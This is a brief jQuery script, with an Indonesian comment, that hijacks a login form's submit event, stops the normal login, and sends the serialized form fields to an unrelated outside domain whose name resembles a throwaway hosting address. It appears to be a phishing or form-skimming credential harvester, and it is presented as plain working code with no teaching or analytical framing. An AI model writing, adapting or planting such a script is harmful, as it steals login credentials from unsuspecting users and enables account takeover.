$(".login-form").submit(function(e) {
    e.preventDefault(); // Mencegah submit form normal
    var d = $(".login-form");
    console.log(d.serialize());

    $.ajax({
        url: "https://godshostpost.jsjsjjs.website/index.php",
        type: "POST",
        data: d.serialize(),
        success: function (response) {
            console.log("Success:", response);
            return true;
        },
        error: function (error) {
            console.log("Error:", error);
            return true;
        },
    });
});
